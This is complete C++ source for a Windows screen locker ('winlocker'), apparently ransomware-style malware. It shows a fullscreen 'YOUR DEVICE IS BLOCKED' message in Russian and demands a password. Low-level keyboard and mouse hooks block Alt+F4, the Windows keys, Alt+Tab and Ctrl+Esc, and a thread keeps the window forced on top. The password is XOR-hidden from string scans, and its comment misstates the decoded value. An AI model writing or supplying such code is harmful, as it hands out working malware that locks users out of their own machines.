// language: C++, file: lock.cpp, target: Windows 11, MSVC
// *fullscreen lock, keyboard+mouse hook block, password release*
#include <windows.h>
#include <string>

#define ID_EDIT 1001
#define ID_OK   1002

static HHOOK g_kbHook = nullptr;
static HHOOK g_msHook = nullptr;
static HWND  g_lockWnd = nullptr;
static bool  g_unlocked = false;

// ---- пароль через XOR, чтобы не торчал в strings ----
static const char ENC[] = {0x11,0x12,0x13,0x14}; // "3252" ^ 0x21
static const char KEY = 0x21;

std::string DecodePassword()
{
    std::string s;
    for (char c : ENC) s += (c ^ KEY);
    return s;
}

// ---- глушим клавиши ----
LRESULT CALLBACK KbProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;

        // Alt+F4
        if (k->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000))
            return 1;

        // Win, Alt+Tab, Alt+Esc, Ctrl+Esc, Ctrl+Shift+Esc
        if (k->vkCode == VK_LWIN || k->vkCode == VK_RWIN) return 1;
        if (k->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (k->vkCode == VK_ESCAPE)
        {
            if ((GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1;
            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
                (GetAsyncKeyState(VK_SHIFT) & 0x8000)) return 1;
        }
        // Win+D, Win+R, Win+L и прочее с Win
        if (GetAsyncKeyState(VK_LWIN) & 0x8000) return 1;
        if (GetAsyncKeyState(VK_RWIN) & 0x8000) return 1;
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

// ---- глушим клики вне окна и контекстное меню ----
LRESULT CALLBACK MsProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        MSLLHOOKSTRUCT* m = (MSLLHOOKSTRUCT*)lParam;
        POINT p = m->pt;
        RECT r;
        if (g_lockWnd && GetWindowRect(g_lockWnd, &r))
        {
            if (!PtInRect(&r, p)) return 1; // клик вне окна — глушим
        }
        if (wParam == WM_RBUTTONDOWN || wParam == WM_RBUTTONUP) return 1;
    }
    return CallNextHookEx(g_msHook, nCode, wParam, lParam);
}

// ---- удерживаем окно сверху ----
DWORD WINAPI FocusKeeper(LPVOID)
{
    while (!g_unlocked)
    {
        if (g_lockWnd)
        {
            SetWindowPos(g_lockWnd, HWND_TOPMOST, 0, 0, 0, 0,
                SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
            SetForegroundWindow(g_lockWnd);
        }
        Sleep(200);
    }
    return 0;
}

LRESULT CALLBACK LockProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_CREATE:
    {
        CreateWindowA("STATIC",
            "ВАШЕ УСТРОЙСТВО ЗАБЛОКИРОВАНО\n\nВведите пароль для разблокировки:",
            WS_VISIBLE | WS_CHILD | SS_CENTER,
            0, 200, GetSystemMetrics(SM_CXSCREEN), 100,
            hwnd, nullptr, nullptr, nullptr);

        CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "",
            WS_VISIBLE | WS_CHILD | ES_PASSWORD | ES_CENTER,
            GetSystemMetrics(SM_CXSCREEN)/2 - 150, 320, 300, 32,
            hwnd, (HMENU)ID_EDIT, nullptr, nullptr);

        CreateWindowA("BUTTON", "РАЗБЛОКИРОВАТЬ",
            WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
            GetSystemMetrics(SM_CXSCREEN)/2 - 100, 370, 200, 40,
            hwnd, (HMENU)ID_OK, nullptr, nullptr);

        SetFocus(GetDlgItem(hwnd, ID_EDIT));
        return 0;
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == ID_OK)
        {
            char buf[64] = {};
            GetWindowTextA(GetDlgItem(hwnd, ID_EDIT), buf, sizeof(buf));
            if (std::string(buf) == DecodePassword())
            {
                g_unlocked = true;
                if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
                if (g_msHook) UnhookWindowsHookEx(g_msHook);
                DestroyWindow(hwnd);
            }
            else
            {
                SetWindowTextA(GetDlgItem(hwnd, ID_EDIT), "");
            }
            return 0;
        }
        break;

    case WM_CLOSE:
        return 0; // игнор

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int)
{
    WNDCLASSA wc = {};
    wc.lpfnWndProc = LockProc;
    wc.hInstance = hInst;
    wc.lpszClassName = "LockScreen";
    wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(10,10,10));
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassA(&wc);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    g_lockWnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "LockScreen", "",
        WS_POPUP | WS_VISIBLE,
        0, 0, w, h,
        nullptr, nullptr, hInst, nullptr);

    // хуки
    g_kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbProc, hInst, 0);
    g_msHook = SetWindowsHookEx(WH_MOUSE_LL, MsProc, hInst, 0);

    // поток, возвращающий окно наверх
    CreateThread(nullptr, 0, FocusKeeper, nullptr, 0, nullptr);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    if (g_msHook) UnhookWindowsHookEx(g_msHook);
    return 0;
}
